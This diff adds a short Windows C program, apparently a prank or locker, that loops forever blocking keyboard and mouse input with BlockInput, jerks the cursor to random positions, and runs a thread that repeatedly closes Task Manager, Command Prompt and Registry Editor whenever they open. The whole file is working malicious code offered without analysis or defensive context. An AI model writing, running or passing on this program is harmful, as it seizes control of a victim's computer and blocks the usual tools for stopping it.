@@ -1,0 +1,48 @@
+﻿#include <windows.h>
+#include <winable.h>
+
+HWND mywindow, TaskMgr, CMD,Regedit; //hwnd la` 
+DWORD WINAPI DestroyWindows(LPVOID);
+
+int main()
+{
+int x,y;
+CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
+while(1)
+{
+BlockInput( true );
+Sleep(6);
+x = rand()%801;
+y = rand()%601;
+SetCursorPos(x,y);
+}
+
+return 0;
+}
+
+
+DWORD WINAPI DestroyWindows(LPVOID)
+{
+while(1)
+{
+TaskMgr = FindWindow(NULL,"Windows Task Manager");
+CMD = FindWindow(NULL, "Command Prompt");
+Regedit = FindWindow(NULL,"Registry Editor");
+if( TaskMgr != NULL )
+{
+PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+}
+if( CMD != NULL )
+{
+
+PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+}
+if( Regedit != NULL )
+{
+
+PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
+}
+
+Sleep(10);
+}
+}
